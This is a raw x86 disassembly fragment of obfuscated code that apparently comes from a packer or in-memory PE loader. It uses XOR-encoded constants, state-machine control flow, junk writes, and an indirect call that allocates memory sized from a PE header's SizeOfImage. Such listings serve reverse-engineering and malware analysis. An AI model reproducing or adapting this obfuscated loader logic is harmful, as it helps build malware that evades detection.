  4287da:	mov    eax,DWORD PTR [ebp+0x8]
  4287dd:	xor    eax,edi
  4287df:	add    eax,ebx
  4287e1:	mov    DWORD PTR [ebp+0x18],eax
  4287e4:	mov    eax,DWORD PTR [ebp-0x8]
  4287e7:	xor    eax,edi
  4287e9:	lea    eax,[eax+esi*1+0x3272f1]
  4287f0:	xor    eax,edi
  4287f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4287f5:	mov    edx,DWORD PTR [ebp+0x18]
  4287f8:	xor    ecx,edi
  4287fa:	add    ecx,ebx
  4287fc:	cmp    edx,ecx
  4287fe:	je     0x4285fb
  428804:	mov    eax,DWORD PTR [ebp+0x8]
  428807:	mov    ecx,DWORD PTR [ebp+0x18]
  42880a:	xor    eax,edi
  42880c:	add    eax,ebx
  42880e:	cmp    ecx,eax
  428810:	jne    0x428823
  428812:	mov    eax,DWORD PTR [ebp-0x8]
  428815:	mov    ecx,DWORD PTR [ebp+0x1c]
  428818:	xor    eax,edi
  42881a:	lea    eax,[eax+ecx*1+0x3272f1]
  428821:	jmp    0x42889a
  428823:	push   0x18
  428825:	push   DWORD PTR [ebp-0x4]
  428828:	lea    eax,[ebp-0x64]
  42882b:	push   eax
  42882c:	call   0x427b11
  428831:	mov    eax,DWORD PTR [ebp+0x8]
  428834:	mov    ecx,DWORD PTR [ebp-0x18]
  428837:	xor    eax,edi
  428839:	add    eax,ebx
  42883b:	cmp    eax,ecx
  42883d:	je     0x428852
  42883f:	mov    eax,DWORD PTR [ebp+0x8]
  428842:	xor    eax,edi
  428844:	add    eax,ebx
  428846:	push   eax
  428847:	push   0x18
  428849:	lea    eax,[ebp-0x64]
  42884c:	push   eax
  42884d:	call   0x4280f6
  428852:	mov    eax,DWORD PTR [ebp-0x4]
  428855:	add    eax,0x18
  428858:	mov    DWORD PTR [ebp+0x18],eax
  42885b:	push   DWORD PTR [ebp-0x50]
  42885e:	push   DWORD PTR [ebp+0x18]
  428861:	mov    eax,DWORD PTR [ebp-0x54]
  428864:	add    eax,DWORD PTR [ebp-0x20]
  428867:	push   eax
  428868:	call   0x427b11
  42886d:	mov    eax,DWORD PTR [ebp+0x8]
  428870:	mov    ecx,DWORD PTR [ebp-0x18]
  428873:	xor    eax,edi
  428875:	add    eax,ebx
  428877:	cmp    eax,ecx
  428879:	je     0x42888c
  42887b:	push   0x0
  42887d:	push   DWORD PTR [ebp-0x50]
  428880:	mov    eax,DWORD PTR [ebp-0x54]
  428883:	add    eax,DWORD PTR [ebp-0x20]
  428886:	push   eax
  428887:	call   0x4280f6
  42888c:	mov    eax,DWORD PTR [ebp-0x24]
  42888f:	mov    ecx,DWORD PTR [ebp-0x50]
  428892:	add    DWORD PTR [eax],ecx
  428894:	mov    eax,DWORD PTR [ebp-0x50]
  428897:	add    eax,DWORD PTR [ebp+0x1c]
  42889a:	mov    DWORD PTR [ebp+0x1c],eax
  42889d:	mov    eax,DWORD PTR [ebp-0x8]
  4288a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4288a3:	xor    eax,edi
  4288a5:	add    eax,ebx
  4288a7:	imul   eax,ecx
  4288aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4288ad:	mov    edx,DWORD PTR [ebp-0x28]
  4288b0:	xor    ecx,edi
  4288b2:	lea    ecx,[ecx+edx*1+0x3272f1]
  4288b9:	cmp    eax,ecx
  4288bb:	jb     0x428519
  4288c1:	mov    esi,DWORD PTR [ebp+0x14]
  4288c4:	mov    eax,DWORD PTR [ebp-0x20]
  4288c7:	mov    DWORD PTR [esi],eax
  4288c9:	jmp    0x428910
  4288cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4288ce:	mov    edx,DWORD PTR [ebp+0xc]
  4288d1:	xor    ecx,edi
  4288d3:	xor    edx,edi
  4288d5:	add    ecx,ebx
  4288d7:	add    edx,ebx
  4288d9:	cmp    ecx,edx
  4288db:	jne    0x4288ef
  4288dd:	mov    eax,ds:0x7f642ddc
  4288e2:	imul   eax,eax,0x9f15fccf
  4288e8:	mov    ds:0x7f642ddc,eax
  4288ed:	jmp    0x428910
  4288ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4288f2:	xor    ecx,edi
  4288f4:	add    ecx,ebx
  4288f6:	cmp    eax,ecx
  4288f8:	je     0x428906
  4288fa:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  428904:	jmp    0x428910
  428906:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  428910:	pop    edi
  428911:	pop    esi
  428912:	pop    ebx
  428913:	leave  
  428914:	ret    0x18
  428917:	push   ebp
  428918:	mov    ebp,esp
  42891a:	and    esp,0xfffffff8
  42891d:	mov    eax,DWORD PTR [ebp+0x20]
  428920:	sub    esp,0x14
  428923:	push   ebx
  428924:	mov    ebx,DWORD PTR [ebp+0x14]
  428927:	push   esi
  428928:	push   edi
  428929:	cmp    eax,0xf89c85a5
  42892e:	jne    0x42893a
  428930:	push   0xf89c85ba
  428935:	jmp    0x428a6c
  42893a:	mov    eax,DWORD PTR [ebp+0x20]
  42893d:	cmp    eax,0xf89c85ba
  428942:	jne    0x42894e
  428944:	push   0xf89c85bb
  428949:	jmp    0x428a6c
  42894e:	mov    eax,DWORD PTR [ebp+0x20]
  428951:	cmp    eax,0xf89c85bb
  428956:	jne    0x428962
  428958:	push   0xf89c85b8
  42895d:	jmp    0x428a6c
  428962:	mov    eax,DWORD PTR [ebp+0x20]
  428965:	cmp    eax,0xf89c85b8
  42896a:	jne    0x428976
  42896c:	push   0xf89c85b9
  428971:	jmp    0x428a6c
  428976:	mov    ecx,DWORD PTR [ebp+0x20]
  428979:	mov    eax,0xf89c85bc
  42897e:	cmp    ecx,eax
  428980:	jne    0x428a3c
  428986:	mov    eax,DWORD PTR [ebp+0x10]
  428989:	mov    DWORD PTR [esp+0xc],eax
  42898d:	mov    eax,DWORD PTR [ebp+0x18]
  428990:	mov    DWORD PTR [esp+0x14],eax
  428994:	mov    eax,DWORD PTR [ebp+0xc]
  428997:	mov    DWORD PTR [esp+0x18],eax
  42899b:	mov    eax,DWORD PTR [ebp+0x8]
  42899e:	mov    DWORD PTR [esp+0x10],eax
  4289a2:	mov    eax,DWORD PTR [esp+0x10]
  4289a6:	mov    ecx,DWORD PTR [esp+0x14]
  4289aa:	mov    edi,0x75108aa
  4289af:	xor    eax,edi
  4289b1:	mov    esi,0x3272f1
  4289b6:	add    eax,esi
  4289b8:	mov    DWORD PTR [ecx],eax
  4289ba:	mov    eax,DWORD PTR [esp+0xc]
  4289be:	mov    eax,DWORD PTR [eax+0x194]
  4289c4:	mov    ecx,DWORD PTR [eax]
  4289c6:	mov    eax,DWORD PTR [esp+0xc]
  4289ca:	mov    eax,DWORD PTR [eax+0x194]
  4289d0:	mov    eax,DWORD PTR [eax]
  4289d2:	add    eax,DWORD PTR [ecx+0x3c]
  4289d5:	mov    ecx,DWORD PTR [esp+0xc]
  4289d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4289df:	mov    ecx,DWORD PTR [ecx+0x14]
  4289e2:	push   0x4
  4289e4:	push   0x3000
  4289e9:	push   DWORD PTR [eax+0x50]
  4289ec:	push   0x0
  4289ee:	call   ecx
  4289f0:	mov    DWORD PTR [ebx],eax
  4289f2:	mov    eax,DWORD PTR [esp+0x10]
  4289f6:	push   DWORD PTR [esp+0xc]
  4289fa:	xor    eax,edi
  4289fc:	add    eax,esi
  4289fe:	mov    DWORD PTR [esp+0x20],eax
  428a02:	lea    eax,[esp+0x20]
  428a06:	push   eax
  428a07:	push   ebx
  428a08:	push   DWORD PTR [esp+0x20]
  428a0c:	push   DWORD PTR [esp+0x28]
  428a10:	push   DWORD PTR [esp+0x24]
  428a14:	call   0x4283d9
  428a19:	mov    eax,DWORD PTR [esp+0x10]
  428a1d:	mov    ecx,DWORD PTR [ebx]
  428a1f:	xor    eax,edi
  428a21:	add    eax,esi
  428a23:	cmp    ecx,eax
  428a25:	je     0x428a83
  428a27:	mov    eax,DWORD PTR [esp+0x18]
  428a2b:	mov    ecx,DWORD PTR [esp+0x14]
  428a2f:	xor    eax,edi
  428a31:	add    eax,esi
  428a33:	imul   eax,DWORD PTR [esp+0x1c]
  428a38:	mov    DWORD PTR [ecx],eax
  428a3a:	jmp    0x428a83
  428a3c:	mov    ecx,DWORD PTR [ebp+0x20]
  428a3f:	cmp    ecx,0xf89c85b9
  428a45:	jne    0x428a4e
  428a47:	push   0xf89c85be
  428a4c:	jmp    0x428a6c
  428a4e:	mov    ecx,DWORD PTR [ebp+0x20]
  428a51:	cmp    ecx,0xf89c85be
  428a57:	jne    0x428a60
  428a59:	push   0xf89c85bf
  428a5e:	jmp    0x428a6c
  428a60:	mov    ecx,DWORD PTR [ebp+0x20]
  428a63:	cmp    ecx,0xf89c85bf
  428a69:	jne    0x428a83
  428a6b:	push   eax
  428a6c:	push   DWORD PTR [ebp+0x1c]
  428a6f:	push   DWORD PTR [ebp+0x18]
  428a72:	push   ebx
  428a73:	push   DWORD PTR [ebp+0x10]
  428a76:	push   DWORD PTR [ebp+0xc]
  428a79:	push   DWORD PTR [ebp+0x8]
  428a7c:	call   0x428917
  428a81:	mov    DWORD PTR [ebx],eax
  428a83:	mov    eax,DWORD PTR [ebx]
  428a85:	pop    edi
  428a86:	pop    esi
  428a87:	pop    ebx
  428a88:	mov    esp,ebp
  428a8a:	pop    ebp
  428a8b:	ret    0x1c
  428a8e:	push   ebp
  428a8f:	mov    ebp,esp
  428a91:	sub    esp,0xc
  428a94:	mov    eax,0xf89c85a5
  428a99:	mov    DWORD PTR [ebp-0x8],eax
  428a9c:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428aa3:	mov    ecx,DWORD PTR [ebp-0x8]
  428aa6:	xor    ecx,0x75108aa
  428aac:	add    ecx,0x3272f1
  428ab2:	mov    DWORD PTR [ebp-0x4],ecx
  428ab5:	mov    ecx,DWORD PTR [ebp+0xc]
  428ab8:	push   eax
  428ab9:	mov    DWORD PTR [ebp+0xc],ecx
  428abc:	push   DWORD PTR [ebp+0xc]
  428abf:	lea    eax,[ebp-0x4]
  428ac2:	push   DWORD PTR [ebp+0x8]
  428ac5:	push   eax
  428ac6:	push   DWORD PTR [ebp+0xc]
  428ac9:	push   DWORD PTR [ebp-0xc]
  428acc:	push   DWORD PTR [ebp-0x8]
  428acf:	call   0x428917
  428ad4:	mov    DWORD PTR [ebp-0x4],eax
  428ad7:	mov    eax,DWORD PTR [ebp-0x4]
  428ada:	leave  
  428adb:	ret    0x8
